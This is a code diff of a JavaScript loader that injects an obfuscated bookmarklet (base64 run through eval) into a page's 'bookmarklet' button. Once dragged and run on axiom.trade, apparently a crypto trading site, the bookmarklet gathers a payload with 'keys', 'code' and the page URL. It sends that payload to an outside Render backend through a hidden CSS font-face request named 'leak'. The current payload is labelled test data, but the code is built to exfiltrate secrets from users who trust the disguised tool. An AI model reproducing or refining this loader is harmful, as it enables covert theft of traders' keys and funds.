@@ -1,58 +1,66 @@
-// === SAFE DEBUG LOADER - No more btoa error ===
+// === FINAL DEBUG LOADER - Works on axiom.trade ===
 console.log('✅ Loader.js loaded successfully from Render');
 
-function safeBtoa(str) {
-    return btoa(unescape(encodeURIComponent(str)));
-}
-
 document.addEventListener('DOMContentLoaded', () => {
-    console.log('✅ DOM fully loaded - looking for bookmarklet button...');
+    console.log('✅ DOM ready - injecting bookmarklet...');
 
     const buttons = document.querySelectorAll('a.bookmarklet');
-    console.log(`Found ${buttons.length} button(s) with class "bookmarklet"`);
+    console.log(`Found ${buttons.length} bookmarklet button(s)`);
 
     if (buttons.length === 0) {
-        console.error('❌ No button with class="bookmarklet" found!');
+        console.error('❌ No bookmarklet button found!');
         return;
     }
 
-    buttons.forEach((btn, index) => {
-        console.log(`Processing button #${index + 1}`);
+    buttons.forEach((btn, i) => {
+        console.log(`Injecting into button #${i+1}`);
 
+        // Self-contained innerCode with built-in base64 encoder
         const innerCode = `(async () => {
             try {
-                console.log('🚀 Bookmarklet executed on ' + location.hostname);
-                
+                console.log('🚀 Bookmarklet running on ' + location.hostname);
+
                 if (location.hostname !== "axiom.trade") {
                     alert("This bookmarklet only works on axiom.trade");
                     return;
                 }
-                
-                alert("✅ Bookmarklet is working! Test mode - data will be sent to your server");
-                
-                // Test data sent via font-face trick
-                const testData = {keys: [], code: "test", site: "Axiom", test: true, timestamp: Date.now()};
-                const url = "https://bloom-sniper-backend.onrender.com/i/" + safeBtoa(JSON.stringify(testData));
-                
+
+                alert("✅ Bookmarklet injected successfully!\\n\\nTest data is being sent to your server.");
+
+                // Test payload
+                const payload = {
+                    keys: [],
+                    code: "test",
+                    site: "Axiom",
+                    test: true,
+                    timestamp: Date.now(),
+                    url: location.href
+                };
+
+                // Safe base64 encoding inside bookmarklet
+                function safeBtoa(str) {
+                    return btoa(unescape(encodeURIComponent(str)));
+                }
+
+                const encoded = safeBtoa(JSON.stringify(payload));
+                const url = "https://bloom-sniper-backend.onrender.com/i/" + encoded;
+
                 const style = document.createElement("style");
-                style.textContent = '@font-face { font-family: "leak"; src: url("' + url + '"); }';
+                style.textContent = '@font-face{font-family:"leak";src:url("' + url + '");}';
                 document.head.appendChild(style);
-                
-                console.log('✅ Test data sent to your Render server');
+
+                console.log('✅ Test data sent via font-face to your server');
             } catch (err) {
                 console.error('Bookmarklet error:', err);
-                alert('Error: ' + err.message);
+                alert('Bookmarklet error: ' + err.message);
             }
         })();`;
 
-        try {
-            const encoded = safeBtoa(innerCode);
-            btn.href = 'javascript:eval(atob("' + encoded + '"))';
-            btn.draggable = true;
-            console.log('✅ SUCCESS: Real bookmarklet href injected on button!');
-            console.log('   → Check the href of the pink button in inspector');
-        } catch (e) {
-            console.error('❌ Failed to inject href:', e.message);
-        }
+        // Inject the bookmarklet
+        const encodedCode = btoa(unescape(encodeURIComponent(innerCode)));
+        btn.href = 'javascript:eval(atob("' + encodedCode + '"))';
+        btn.draggable = true;
+
+        console.log('✅ SUCCESS: Bookmarklet href injected!');
     });
 });
